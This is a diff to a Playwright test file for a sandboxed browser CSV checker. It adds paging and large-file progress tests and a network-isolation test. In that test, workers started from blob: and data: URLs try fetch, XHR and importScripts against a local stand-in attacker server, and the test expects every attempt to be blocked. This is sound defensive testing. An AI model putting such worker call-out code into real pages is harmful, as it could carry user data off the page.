@@ -4,6 +4,7 @@ import type { AddressInfo } from "node:net";
 import { fileURLToPath } from "node:url";
 import { expect, test, type Download, type Frame, type Page } from "@playwright/test";
 import { unzip } from "../src/shared/unzip.testing";
+import { LARGE_KINDS, largeCsv } from "../src/tools/csv-precheck/large-fixture.testing";
 
 // A stand-in for an attacker's server: any request reaching it means data could leave the page.
 let exfil: Server;
@@ -360,7 +361,64 @@ test("thousands of ragged rows read as one finding with a count", async ({ page 
   await expect(finding).toHaveCount(1);
   await expect(finding.locator(".count")).toHaveText("(5,000)");
   await expect(finding.locator(".example")).toHaveCount(5);
-  await expect(finding.locator(".more")).toHaveText("and 4,995 more");
+  await expect(finding.locator(".more-count")).toHaveText("and 4,995 more");
+
+  // The rest come a page at a time.
+  await finding.locator(".show-more").click();
+  await expect(finding.locator(".example")).toHaveCount(55);
+  await expect(finding.locator(".example").nth(54)).toContainText("Row 55 (line 56)");
+  await expect(finding.locator(".more-count")).toHaveText("and 4,945 more");
+  await finding.locator(".show-more").click();
+  await expect(finding.locator(".example")).toHaveCount(105);
+});
+
+test("the last page of a group shows only what is left, then the control goes", async ({
+  page,
+}) => {
+  const frame = await sandbox(page);
+  const rows = Array.from({ length: 60 }, (_, i) => `${i},2,3\n`).join("");
+  await openCsv(frame, "a,b\n" + rows);
+  const finding = frame.locator(".finding");
+  await expect(finding.locator(".show-more")).toHaveText("Show 50 more");
+  await finding.locator(".show-more").click();
+  await expect(finding.locator(".show-more")).toHaveText("Show 5 more");
+  await finding.locator(".show-more").click();
+  await expect(finding.locator(".example")).toHaveCount(60);
+  await expect(finding.locator(".more")).toBeHidden();
+});
+
+test("a 100,000-row file shows progress, keeps the page responsive, then the report", async ({
+  page,
+}) => {
+  const frame = await sandbox(page);
+  await openCsv(frame, largeCsv(), "large.csv");
+  await expect(frame.locator("#progress")).toBeVisible();
+  await expect(frame.locator("#progress-text")).toContainText("large.csv");
+
+  // For the whole run, the page's own thread keeps answering: no timer waits long.
+  const longestGap = await frame.evaluate(async () => {
+    const progress = document.querySelector<HTMLElement>("#progress")!;
+    let longest = 0;
+    let last = performance.now();
+    const end = last + 30_000;
+    while (!progress.hidden && performance.now() < end) {
+      await new Promise((resolve) => setTimeout(resolve, 10));
+      const now = performance.now();
+      longest = Math.max(longest, now - last);
+      last = now;
+    }
+    return longest;
+  });
+  expect(longestGap).toBeLessThan(250);
+
+  await expect(frame.locator("#summary")).toHaveText("100,000 rows, 20 columns, comma-delimited", {
+    timeout: 30_000,
+  });
+  await expect(frame.locator("#progress")).toBeHidden();
+  const kinds = await frame
+    .locator(".finding")
+    .evaluateAll((els) => els.map((el) => (el as HTMLElement).dataset.kind));
+  for (const kind of LARGE_KINDS) expect(kinds).toContain(kind);
 });
 
 test("opening a second file replaces the first report", async ({ page }) => {
@@ -446,6 +504,54 @@ test("the sandbox cannot send anything over the network", async ({ page }) => {
     };
   }, exfilUrl);
 
+  // A worker started the way the page starts its own, from a blob: URL, is held to the page's
+  // policy; a data: worker, Vite's fallback, does not start at all.
+  const workerOutcomes = await frame.evaluate(async (target) => {
+    const code = `
+      const attempt = (p) => p.then(() => "sent", () => "blocked");
+      (async () => {
+        const xhr = await new Promise((resolve) => {
+          const xhr = new XMLHttpRequest();
+          try {
+            xhr.open("GET", "${target}/worker-xhr");
+            xhr.onload = () => resolve("sent");
+            xhr.onerror = () => resolve("blocked");
+            xhr.send();
+          } catch {
+            resolve("blocked");
+          }
+        });
+        let importScriptsOutcome = "sent";
+        try {
+          importScripts("${target}/worker-import");
+        } catch {
+          importScriptsOutcome = "blocked";
+        }
+        postMessage({
+          fetch: await attempt(fetch("${target}/worker-fetch")),
+          xhr,
+          importScripts: importScriptsOutcome,
+        });
+      })();
+    `;
+    const run = (url: string) =>
+      new Promise<unknown>((resolve) => {
+        try {
+          const worker = new Worker(url);
+          worker.onmessage = (e) => resolve(e.data);
+          worker.onerror = () => resolve("did not start");
+          setTimeout(() => resolve("did not start"), 5000);
+        } catch {
+          resolve("did not start");
+        }
+      });
+    const blob = URL.createObjectURL(new Blob([code], { type: "text/javascript" }));
+    return {
+      blob: await run(blob),
+      data: await run(`data:text/javascript,${encodeURIComponent(code)}`),
+    };
+  }, exfilUrl);
+
   expect(outcomes).toMatchObject({
     fetch: "blocked",
     fetchSameOrigin: "blocked",
@@ -453,6 +559,10 @@ test("the sandbox cannot send anything over the network", async ({ page }) => {
     img: "blocked",
     script: "blocked",
     style: "blocked",
+  });
+  expect(workerOutcomes).toEqual({
+    blob: { fetch: "blocked", xhr: "blocked", importScripts: "blocked" },
+    data: "did not start",
   });
   // sendBeacon may report "queued" before CSP drops it; what counts is that nothing arrives.
   await page.waitForTimeout(500);
